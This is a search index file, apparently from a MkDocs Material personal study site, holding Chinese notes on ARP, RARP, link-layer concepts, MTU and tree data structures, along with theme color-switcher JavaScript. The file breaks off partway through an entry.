{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Gunlance https://Gunlance.github.io/GunLance/ \u7c89\u7d2b\u8272\u659c\u4f53 \u4e2a\u4eba\u778e\u60f3 Material color palette \u989c\u8272\u4e3b\u9898 Primary colors \u4e3b\u8272 \u9ed8\u8ba4 Grey \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) }) Accent colors \u8f85\u52a9\u8272 \u9ed8\u8ba4 red \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) })","title":"Home"},{"location":"#gunlance","text":"https://Gunlance.github.io/GunLance/ \u7c89\u7d2b\u8272\u659c\u4f53 \u4e2a\u4eba\u778e\u60f3","title":"Gunlance"},{"location":"#material-color-palette","text":"","title":"Material color palette \u989c\u8272\u4e3b\u9898"},{"location":"#primary-colors","text":"\u9ed8\u8ba4 Grey \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) })","title":"Primary colors \u4e3b\u8272"},{"location":"#accent-colors","text":"\u9ed8\u8ba4 red \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) })","title":"Accent colors \u8f85\u52a9\u8272"},{"location":"Base/\u6570\u636e\u7ed3\u6784/\u6811/","text":"\u4e8c\u53c9\u641c\u7d22\u6811 \u7ea2\u9ed1\u6811 B\u6811","title":"\u6811"},{"location":"Base/\u6570\u636e\u7ed3\u6784/\u6811/#_1","text":"","title":"\u4e8c\u53c9\u641c\u7d22\u6811"},{"location":"Base/\u6570\u636e\u7ed3\u6784/\u6811/#_2","text":"","title":"\u7ea2\u9ed1\u6811"},{"location":"Base/\u6570\u636e\u7ed3\u6784/\u6811/#b","text":"","title":"B\u6811"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u534f\u8bae\u4e0e\u7b97\u6cd5/","text":"\u94fe\u8def\u5c42 \u534f\u8bae ARP \u7f51\u7edc\u5c42 \u7b97\u6cd5 ECMP ECMP\uff0cEqual-Const MultiPath Routing\uff0c\u7b49\u4ef7\u591a\u8def\u7531\uff0c \u662f\u4e00\u4e2a\u9010\u8df3\u7684\uff0c\u57fa\u4e8e\u6d41\u7684\u8d1f\u8f7d\u5747\u8861\u7b56\u7565","title":"\u534f\u8bae\u4e0e\u7b97\u6cd5"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u534f\u8bae\u4e0e\u7b97\u6cd5/#_1","text":"","title":"\u94fe\u8def\u5c42"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u534f\u8bae\u4e0e\u7b97\u6cd5/#arp","text":"","title":"\u534f\u8bae ARP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u534f\u8bae\u4e0e\u7b97\u6cd5/#_2","text":"","title":"\u7f51\u7edc\u5c42"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u534f\u8bae\u4e0e\u7b97\u6cd5/#ecmp","text":"ECMP\uff0cEqual-Const MultiPath Routing\uff0c\u7b49\u4ef7\u591a\u8def\u7531\uff0c \u662f\u4e00\u4e2a\u9010\u8df3\u7684\uff0c\u57fa\u4e8e\u6d41\u7684\u8d1f\u8f7d\u5747\u8861\u7b56\u7565","title":"\u7b97\u6cd5 ECMP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/\u6982\u8ff0/","text":"","title":"\u6982\u8ff0"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/ARP \u4e0e RARP/","text":"ARP \u53ea\u5bf9TCP/IP\u534f\u8bae\u7c07\u6709\u610f\u4e49\u7684IP\u5730\u5740\u3002\u6570\u636e\u94fe\u8def\u5982\u4ee5\u592a\u7f51\u6216\u4ee4\u724c\u73af\u7f51\u90fd\u6709\u81ea\u5df1\u7684\u5bfb\u5740\u673a\u5236\uff08\u5e38\u5e38\u4e3a48bit\u5730\u5740) \u5f53\u4e00\u53f0\u4e3b\u673a\u628a\u4ee5\u592a\u7f51\u6570\u636e\u5e27\u53d1\u9001\u5230\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u4e0a\u7684\u53e6\u4e00\u53f0\u4e3b\u673a\u65f6\uff0c\u662f\u6839\u636e 48 bit\u7684\u4ee5\u592a\u7f51\u5730\u5740\u6765\u786e\u5b9a\u76ee\u7684\u63a5\u53e3\u7684\u3002 ARP\u4e3a IP\u5730\u5740\u5230\u5bf9\u5e94\u7684\u786c\u4ef6\u5730\u5740 \u4e4b\u95f4\u63d0\u4f9b\u52a8\u6001\u6620\u5c04\u3002\u6211\u4eec\u4e4b\u6240\u4ee5\u7528\u52a8\u6001\u8fd9\u4e2a\u8bcd\u662f\u56e0\u4e3a\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u4e00\u822c\u5e94\u7528\u7a0b\u5e8f\u7528\u6237\u6216\u7cfb\u7edf\u7ba1\u7406\u5458\u4e0d\u5fc5\u5173\u5fc3\u3002 RARP\u662f\u88ab\u90a3\u4e9b\u6ca1\u6709\u78c1\u76d8\u9a71\u52a8\u5668\u7684\u7cfb\u7edf\u4f7f\u7528\uff08\u4e00\u822c\u662f\u65e0\u76d8\u5de5\u4f5c\u7ad9\u6216 X\u7ec8\u7aef\uff09\uff0c\u5b83\u9700\u8981\u7cfb\u7edf\u7ba1\u7406\u5458\u8fdb\u884c\u624b\u5de5\u8bbe\u7f6e\u3002 \u4f8b\u5b50 \u8f93\u5165\u547d\u4ee4 1 ftp bsdi \u8fde\u63a5\u5230\u540d\u4e3absdi\u7684ftp\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u65f6\u5019\u7684\u94fe\u63a5\u6b65\u9aa4\u5982\u4e0b \u5e94\u7528\u7a0b\u5e8fFTP\u5ba2\u6237\u7aef\u8c03\u7528\u51fd\u6570 gethostbyname \u628a\u4e3b\u673a\u540d\uff08bsdi\uff09\u8f6c\u6362\u621032bit\u7684IP\u5730\u5740\u3002 \u8fd9\u4e2a\u51fd\u6570\u5728DNS\u4e2d\u79f0\u4f5c\u89e3\u6790\u5668\uff0c\u8fd9\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u6216\u8005\u4f7f\u7528DNS\uff0c\u6216\u8005\u5728\u8f83\u5c0f\u7f51\u7edc\u4e2d\u4f7f\u7528\u4e00\u4e2a\u9759\u6001\u7684\u4e3b\u673a\u6587\u4ef6\u3002 FTP\u5ba2\u6237\u7aef\u8bf7\u6c42TCP\u7528\u5f97\u5230\u7684IP\u5730\u5740\u5efa\u7acb\u8fde\u63a5 TCP\u53d1\u9001\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u5206\u6bb5\u5230\u8fdc\u7aef\u7684\u4e3b\u673a\uff0c\u5373\u7528\u4e0a\u8ff0IP\u5730\u5740\u53d1\u9001\u4e00\u4efdIP\u6570\u636e\u62a5 \u5982\u679c\u76ee\u7684\u4e3b\u673a\u5728\u672c\u5730\u7f51\u7edc\u4e0a\uff08\u5982\u4ee5\u592a\u7f51\u3001\u4ee4\u724c\u73af\u7f51\u6216\u70b9\u5bf9\u70b9\u94fe\u63a5\u7684\u53e6\u4e00\u7aef\uff09\uff0c\u90a3\u4e48IP\u6570\u636e\u62a5\u53ef\u4ee5\u76f4\u63a5\u9001\u5230\u76ee\u7684\u4e3b\u673a\u4e0a\u3002\u5982\u679c\u76ee\u7684\u4e3b\u673a\u5728\u4e00\u4e2a\u8fdc\u7a0b\u7f51\u7edc\u4e0a\uff0c\u90a3\u4e48\u5c31\u901a\u8fc7IP\u9009\u8def\u51fd\u6570\u6765\u786e\u5b9a\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e0a\u7684\u4e0b\u4e00\u7ad9\u8def\u7531\u5668\u5730\u5740\uff0c\u5e76\u8ba9\u5b83\u8f6c\u53d1IP\u6570\u636e\u62a5\u3002\u5728\u8fd9\u4e24\u79cd\u60c5 \u51b5\u4e0b\uff0cIP\u6570\u636e\u62a5\u90fd\u662f\u88ab\u9001\u5230\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e0a\u7684\u4e00\u53f0\u4e3b\u673a\u6216\u8def\u7531\u5668 \u5047\u5b9a\u662f\u4e00\u4e2a\u4ee5\u592a\u7f51\uff0c\u90a3\u4e48\u53d1\u9001\u7aef\u4e3b\u673a\u5fc5\u987b\u628a32bit\u7684IP\u5730\u5740\u53d8\u6362\u621048bit\u7684\u4ee5\u592a\u7f51\u5730\u5740\u3002\u4ece\u903b\u8f91Internet\u5730\u5740\u5230\u5bf9\u5e94\u7684\u7269\u7406\u786c\u4ef6\u5730\u5740\u9700\u8981\u8fdb\u884c\u7ffb\u8bd1\u3002\u8fd9\u5c31\u662fARP\u7684\u529f\u80fd\u3002ARP\u672c\u6765\u662f\u7528\u4e8e\u5e7f\u64ad\u7f51\u7edc\u7684\uff0c\u6709\u8bb8\u591a\u4e3b\u673a\u6216\u8def\u7531\u5668\u8fde\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a ARP\u53d1\u9001\u4e00\u4efd\u79f0\u4f5cARP\u8bf7\u6c42\u7684\u4ee5\u592a\u7f51\u6570\u636e\u5e27\u7ed9\u4ee5\u592a\u7f51\u4e0a\u7684\u6bcf\u4e2a\u4e3b\u673a\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4f5c\u5e7f\u64ad\u3002ARP\u8bf7\u6c42\u6570\u636e\u5e27\u4e2d\u5305\u542b\u76ee\u7684\u4e3b\u673a\u7684IP\u5730\u5740\uff08\u4e3b\u673a\u540d\u4e3absdi\uff09\uff0c\u5176\u610f\u601d\u662f\u201c\u5982\u679c\u4f60\u662f\u8fd9\u4e2aIP\u5730\u5740\u7684\u62e5\u6709\u8005\uff0c\u8bf7\u56de\u7b54\u4f60\u7684\u786c\u4ef6\u5730\u5740\u201d \u76ee\u7684\u4e3b\u673a\u7684ARP\u5c42\u6536\u5230\u8fd9\u4efd\u5e7f\u64ad\u62a5\u6587\u540e\uff0c\u8bc6\u522b\u51fa\u8fd9\u662f\u53d1\u9001\u7aef\u5728\u5bfb\u95ee\u5b83\u7684IP\u5730\u5740\uff0c\u4e8e\u662f\u53d1\u9001\u4e00\u4e2aARP\u5e94\u7b54\u3002\u8fd9\u4e2aARP\u5e94\u7b54\u5305\u542bIP\u5730\u5740\u53ca\u5bf9\u5e94\u7684\u786c\u4ef6\u5730\u5740\u3002 \u6536\u5230ARP\u5e94\u7b54\u540e\uff0c\u4f7fARP\u8fdb\u884c\u8bf7\u6c42\u2014\u5e94\u7b54\u4ea4\u6362\u7684IP\u6570\u636e\u62a5\u73b0\u5728\u5c31\u53ef\u4ee5\u4f20\u9001\u4e86\u3002 \u53d1\u9001IP\u6570\u636e\u62a5\u5230\u76ee\u7684\u4e3b\u673a\u3002 Free Arp \u5b83\u662f\u6307\u4e3b\u673a\u53d1\u9001ARP\u67e5\u627e\u81ea\u5df1\u7684IP\u5730\u5740\u3002\u901a\u5e38\uff0c\u5b83\u53d1\u751f\u5728\u7cfb\u7edf\u5f15\u5bfc\u671f\u95f4\u8fdb\u884c\u63a5\u53e3\u914d\u7f6e\u7684\u65f6\u5019 RARP","title":"ARP \u4e0e RARP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/ARP \u4e0e RARP/#arp","text":"\u53ea\u5bf9TCP/IP\u534f\u8bae\u7c07\u6709\u610f\u4e49\u7684IP\u5730\u5740\u3002\u6570\u636e\u94fe\u8def\u5982\u4ee5\u592a\u7f51\u6216\u4ee4\u724c\u73af\u7f51\u90fd\u6709\u81ea\u5df1\u7684\u5bfb\u5740\u673a\u5236\uff08\u5e38\u5e38\u4e3a48bit\u5730\u5740) \u5f53\u4e00\u53f0\u4e3b\u673a\u628a\u4ee5\u592a\u7f51\u6570\u636e\u5e27\u53d1\u9001\u5230\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u4e0a\u7684\u53e6\u4e00\u53f0\u4e3b\u673a\u65f6\uff0c\u662f\u6839\u636e 48 bit\u7684\u4ee5\u592a\u7f51\u5730\u5740\u6765\u786e\u5b9a\u76ee\u7684\u63a5\u53e3\u7684\u3002 ARP\u4e3a IP\u5730\u5740\u5230\u5bf9\u5e94\u7684\u786c\u4ef6\u5730\u5740 \u4e4b\u95f4\u63d0\u4f9b\u52a8\u6001\u6620\u5c04\u3002\u6211\u4eec\u4e4b\u6240\u4ee5\u7528\u52a8\u6001\u8fd9\u4e2a\u8bcd\u662f\u56e0\u4e3a\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u4e00\u822c\u5e94\u7528\u7a0b\u5e8f\u7528\u6237\u6216\u7cfb\u7edf\u7ba1\u7406\u5458\u4e0d\u5fc5\u5173\u5fc3\u3002 RARP\u662f\u88ab\u90a3\u4e9b\u6ca1\u6709\u78c1\u76d8\u9a71\u52a8\u5668\u7684\u7cfb\u7edf\u4f7f\u7528\uff08\u4e00\u822c\u662f\u65e0\u76d8\u5de5\u4f5c\u7ad9\u6216 X\u7ec8\u7aef\uff09\uff0c\u5b83\u9700\u8981\u7cfb\u7edf\u7ba1\u7406\u5458\u8fdb\u884c\u624b\u5de5\u8bbe\u7f6e\u3002","title":"ARP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/ARP \u4e0e RARP/#_1","text":"\u8f93\u5165\u547d\u4ee4 1 ftp bsdi \u8fde\u63a5\u5230\u540d\u4e3absdi\u7684ftp\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u65f6\u5019\u7684\u94fe\u63a5\u6b65\u9aa4\u5982\u4e0b \u5e94\u7528\u7a0b\u5e8fFTP\u5ba2\u6237\u7aef\u8c03\u7528\u51fd\u6570 gethostbyname \u628a\u4e3b\u673a\u540d\uff08bsdi\uff09\u8f6c\u6362\u621032bit\u7684IP\u5730\u5740\u3002 \u8fd9\u4e2a\u51fd\u6570\u5728DNS\u4e2d\u79f0\u4f5c\u89e3\u6790\u5668\uff0c\u8fd9\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u6216\u8005\u4f7f\u7528DNS\uff0c\u6216\u8005\u5728\u8f83\u5c0f\u7f51\u7edc\u4e2d\u4f7f\u7528\u4e00\u4e2a\u9759\u6001\u7684\u4e3b\u673a\u6587\u4ef6\u3002 FTP\u5ba2\u6237\u7aef\u8bf7\u6c42TCP\u7528\u5f97\u5230\u7684IP\u5730\u5740\u5efa\u7acb\u8fde\u63a5 TCP\u53d1\u9001\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u5206\u6bb5\u5230\u8fdc\u7aef\u7684\u4e3b\u673a\uff0c\u5373\u7528\u4e0a\u8ff0IP\u5730\u5740\u53d1\u9001\u4e00\u4efdIP\u6570\u636e\u62a5 \u5982\u679c\u76ee\u7684\u4e3b\u673a\u5728\u672c\u5730\u7f51\u7edc\u4e0a\uff08\u5982\u4ee5\u592a\u7f51\u3001\u4ee4\u724c\u73af\u7f51\u6216\u70b9\u5bf9\u70b9\u94fe\u63a5\u7684\u53e6\u4e00\u7aef\uff09\uff0c\u90a3\u4e48IP\u6570\u636e\u62a5\u53ef\u4ee5\u76f4\u63a5\u9001\u5230\u76ee\u7684\u4e3b\u673a\u4e0a\u3002\u5982\u679c\u76ee\u7684\u4e3b\u673a\u5728\u4e00\u4e2a\u8fdc\u7a0b\u7f51\u7edc\u4e0a\uff0c\u90a3\u4e48\u5c31\u901a\u8fc7IP\u9009\u8def\u51fd\u6570\u6765\u786e\u5b9a\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e0a\u7684\u4e0b\u4e00\u7ad9\u8def\u7531\u5668\u5730\u5740\uff0c\u5e76\u8ba9\u5b83\u8f6c\u53d1IP\u6570\u636e\u62a5\u3002\u5728\u8fd9\u4e24\u79cd\u60c5 \u51b5\u4e0b\uff0cIP\u6570\u636e\u62a5\u90fd\u662f\u88ab\u9001\u5230\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e0a\u7684\u4e00\u53f0\u4e3b\u673a\u6216\u8def\u7531\u5668 \u5047\u5b9a\u662f\u4e00\u4e2a\u4ee5\u592a\u7f51\uff0c\u90a3\u4e48\u53d1\u9001\u7aef\u4e3b\u673a\u5fc5\u987b\u628a32bit\u7684IP\u5730\u5740\u53d8\u6362\u621048bit\u7684\u4ee5\u592a\u7f51\u5730\u5740\u3002\u4ece\u903b\u8f91Internet\u5730\u5740\u5230\u5bf9\u5e94\u7684\u7269\u7406\u786c\u4ef6\u5730\u5740\u9700\u8981\u8fdb\u884c\u7ffb\u8bd1\u3002\u8fd9\u5c31\u662fARP\u7684\u529f\u80fd\u3002ARP\u672c\u6765\u662f\u7528\u4e8e\u5e7f\u64ad\u7f51\u7edc\u7684\uff0c\u6709\u8bb8\u591a\u4e3b\u673a\u6216\u8def\u7531\u5668\u8fde\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a ARP\u53d1\u9001\u4e00\u4efd\u79f0\u4f5cARP\u8bf7\u6c42\u7684\u4ee5\u592a\u7f51\u6570\u636e\u5e27\u7ed9\u4ee5\u592a\u7f51\u4e0a\u7684\u6bcf\u4e2a\u4e3b\u673a\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4f5c\u5e7f\u64ad\u3002ARP\u8bf7\u6c42\u6570\u636e\u5e27\u4e2d\u5305\u542b\u76ee\u7684\u4e3b\u673a\u7684IP\u5730\u5740\uff08\u4e3b\u673a\u540d\u4e3absdi\uff09\uff0c\u5176\u610f\u601d\u662f\u201c\u5982\u679c\u4f60\u662f\u8fd9\u4e2aIP\u5730\u5740\u7684\u62e5\u6709\u8005\uff0c\u8bf7\u56de\u7b54\u4f60\u7684\u786c\u4ef6\u5730\u5740\u201d \u76ee\u7684\u4e3b\u673a\u7684ARP\u5c42\u6536\u5230\u8fd9\u4efd\u5e7f\u64ad\u62a5\u6587\u540e\uff0c\u8bc6\u522b\u51fa\u8fd9\u662f\u53d1\u9001\u7aef\u5728\u5bfb\u95ee\u5b83\u7684IP\u5730\u5740\uff0c\u4e8e\u662f\u53d1\u9001\u4e00\u4e2aARP\u5e94\u7b54\u3002\u8fd9\u4e2aARP\u5e94\u7b54\u5305\u542bIP\u5730\u5740\u53ca\u5bf9\u5e94\u7684\u786c\u4ef6\u5730\u5740\u3002 \u6536\u5230ARP\u5e94\u7b54\u540e\uff0c\u4f7fARP\u8fdb\u884c\u8bf7\u6c42\u2014\u5e94\u7b54\u4ea4\u6362\u7684IP\u6570\u636e\u62a5\u73b0\u5728\u5c31\u53ef\u4ee5\u4f20\u9001\u4e86\u3002 \u53d1\u9001IP\u6570\u636e\u62a5\u5230\u76ee\u7684\u4e3b\u673a\u3002","title":"\u4f8b\u5b50"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/ARP \u4e0e RARP/#free-arp","text":"\u5b83\u662f\u6307\u4e3b\u673a\u53d1\u9001ARP\u67e5\u627e\u81ea\u5df1\u7684IP\u5730\u5740\u3002\u901a\u5e38\uff0c\u5b83\u53d1\u751f\u5728\u7cfb\u7edf\u5f15\u5bfc\u671f\u95f4\u8fdb\u884c\u63a5\u53e3\u914d\u7f6e\u7684\u65f6\u5019","title":"Free Arp"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/ARP \u4e0e RARP/#rarp","text":"","title":"RARP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/","text":"\u5f15\u8a00 \u94fe\u8def\u5c42\u4e3b\u8981\u6709\u4e09\u4e2a\u76ee\u7684 \u4e3aIP\u6a21\u5757\u53d1\u9001\u548c\u63a5\u6536IP\u6570\u636e\u62a5 \u4e3aARP\u6a21\u5757\u53d1\u9001ARP\u8bf7\u6c42\u548c\u63a5\u6536ARP\u5e94\u7b54 \u4e3aRARP\u53d1\u9001RARP\u8bf7\u6c42\u548c\u63a5\u6536RARP\u5e94\u7b54 \u5c01\u88c5 SLIP \u4e32\u884c\u7ebf\u8defIP \u538b\u7f29\u7684SLIP PPP\u70b9\u5bf9\u70b9\u534f\u8bae \u60f3\u8d77\u4e86408\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u88ab\u8fd9\u4e2a\u77e5\u8bc6\u70b9\u5751\u4e86\u51e0\u56de\uff0c\u53bb\u4ed6\u59880x7d,0x5e \u73af\u56de\u63a5\u53e3 \u5927\u591a\u6570\u7684\u4ea7\u54c1\u90fd\u652f\u6301\u73af\u56de\u63a5\u53e3\uff08Loopback Interface\uff09\uff0c\u4ee5\u5141\u8bb8\u8fd0\u884c\u5728\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\u7684\u5ba2\u6237 \u7a0b\u5e8f\u548c\u670d\u52a1\u5668\u7a0b\u5e8f\u901a\u8fc7TCP/IP\u8fdb\u884c\u901a\u4fe1\u3002A\u7c7b\u7f51\u7edc\u53f7127\u5c31\u662f\u4e3a\u73af\u56de\u63a5\u53e3\u9884\u7559\u7684 \u6700\u5927\u4f20\u8f93\u5355\u5143 MTU \u4ee5\u592a\u7f51\u548c802.3\u5bf9\u6570\u636e\u5e27\u7684\u957f\u5ea6\u90fd\u6709\u4e00\u4e2a\u9650\u5236\uff0c\u5176\u6700\u5927\u503c\u5206\u522b\u662f1500\u548c1492\u5b57\u8282\u3002\u94fe\u8def\u5c42\u7684\u8fd9\u4e2a\u7279\u6027\u79f0\u4f5cMTU\uff0c\u6700\u5927\u4f20\u8f93\u5355\u5143\u3002 \u4e0d\u540c\u7c7b\u578b\u7684\u7f51\u7edc\u5927\u591a\u6570\u90fd\u6709\u4e00\u4e2a\u4e0a\u9650\u3002\u5982\u679cIP\u5c42\u6709\u4e00\u4e2a\u6570\u636e\u62a5\u8981\u4f20\uff0c\u800c\u4e14\u6570\u636e\u7684\u957f\u5ea6\u6bd4\u94fe\u8def\u5c42\u7684MTU\u8fd8\u5927\uff0c\u90a3\u4e48IP\u5c42\u5c31\u9700\u8981\u8fdb\u884c\u5206\u7247\uff0c\u628a\u6570\u636e\u62a5\u5206\u6210\u82e5\u5e72\u7247\uff0c\u8fd9\u6837\u6bcf\u4e00\u7247\u90fd\u5c0f\u4e8eMTU\u3002 \u60f3\u8d77\u4e86408\u8ba1\u7b97\u673a\u7f51\u7edc\u8ba1\u7b97\u6700\u5927\u4f20\u8f93\u5355\u5143\u7684\u65e5\u5b50 \u8def\u5f84MTU \u5f53\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u4e24\u53f0\u4e3b\u673a\u4e92\u76f8\u8fdb\u884c\u901a\u4fe1\u65f6\uff0c\u8be5\u7f51\u7edc\u7684MTU\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002 \u4f46\u662f\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u8981\u901a\u8fc7\u591a\u4e2a\u7f51\u7edc\uff0c\u90a3\u4e48\u6bcf\u4e2a\u7f51\u7edc\u7684\u94fe\u8def\u5c42\u5c31\u53ef\u80fd\u6709\u4e0d\u540c\u7684MTU\u3002\u91cd\u8981\u7684\u4e0d\u662f\u4e24\u53f0\u4e3b\u673a\u6240\u5728\u7f51\u7edc\u7684MTU\u7684\u503c\uff0c\u91cd\u8981\u7684\u662f\u4e24\u53f0\u901a\u4fe1\u4e3b\u673a\u8def\u5f84\u4e2d\u7684\u6700\u5c0fMTU\uff0c\u5b83\u88ab\u79f0\u4f5c\u8def\u5f84MTU\u3002 \u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u8def\u5f84MTU\u4e0d\u4e00\u5b9a\u662f\u4e2a\u5e38\u6570\u3002\u5b83 \u53d6\u51b3\u4e8e\u5f53\u65f6\u6240\u9009\u62e9\u7684\u8def\u7531 \u3002\u800c \u9009\u8def\u4e0d\u4e00\u5b9a\u662f\u5bf9\u79f0\u7684 \uff08\u4eceA\u5230B\u7684\u8def\u7531\u53ef\u80fd\u4e0e\u4eceB\u5230A\u7684\u8def\u7531\u4e0d\u540c\uff09\uff0c\u56e0\u6b64\u8def\u5f84MTU\u5728\u4e24\u4e2a\u65b9\u5411\u4e0a\u4e0d\u4e00\u5b9a\u662f \u4e00\u81f4\u7684 \u3002 RFC 1191\u63cf\u8ff0\u4e86\u8def\u5f84MTU\u7684\u53d1\u73b0\u673a\u5236\uff0c\u5373\u5728\u4efb\u4f55\u65f6\u5019\u786e\u5b9a\u8def\u5f84MTU\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u5728\u4ecb\u7ecd\u4e86ICMP\u548cIP\u5206\u7247\u65b9\u6cd5\u4ee5\u540e\u518d\u6765\u770b\u5b83\u662f\u5982\u4f55\u64cd\u4f5c\u7684\u3002","title":"\u94fe\u8def\u5c42"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#_1","text":"\u94fe\u8def\u5c42\u4e3b\u8981\u6709\u4e09\u4e2a\u76ee\u7684 \u4e3aIP\u6a21\u5757\u53d1\u9001\u548c\u63a5\u6536IP\u6570\u636e\u62a5 \u4e3aARP\u6a21\u5757\u53d1\u9001ARP\u8bf7\u6c42\u548c\u63a5\u6536ARP\u5e94\u7b54 \u4e3aRARP\u53d1\u9001RARP\u8bf7\u6c42\u548c\u63a5\u6536RARP\u5e94\u7b54","title":"\u5f15\u8a00"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#_2","text":"","title":"\u5c01\u88c5"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#slip-ip","text":"","title":"SLIP \u4e32\u884c\u7ebf\u8defIP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#slip","text":"","title":"\u538b\u7f29\u7684SLIP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#ppp","text":"\u60f3\u8d77\u4e86408\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u88ab\u8fd9\u4e2a\u77e5\u8bc6\u70b9\u5751\u4e86\u51e0\u56de\uff0c\u53bb\u4ed6\u59880x7d,0x5e","title":"PPP\u70b9\u5bf9\u70b9\u534f\u8bae"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#_3","text":"\u5927\u591a\u6570\u7684\u4ea7\u54c1\u90fd\u652f\u6301\u73af\u56de\u63a5\u53e3\uff08Loopback Interface\uff09\uff0c\u4ee5\u5141\u8bb8\u8fd0\u884c\u5728\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\u7684\u5ba2\u6237 \u7a0b\u5e8f\u548c\u670d\u52a1\u5668\u7a0b\u5e8f\u901a\u8fc7TCP/IP\u8fdb\u884c\u901a\u4fe1\u3002A\u7c7b\u7f51\u7edc\u53f7127\u5c31\u662f\u4e3a\u73af\u56de\u63a5\u53e3\u9884\u7559\u7684","title":"\u73af\u56de\u63a5\u53e3"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 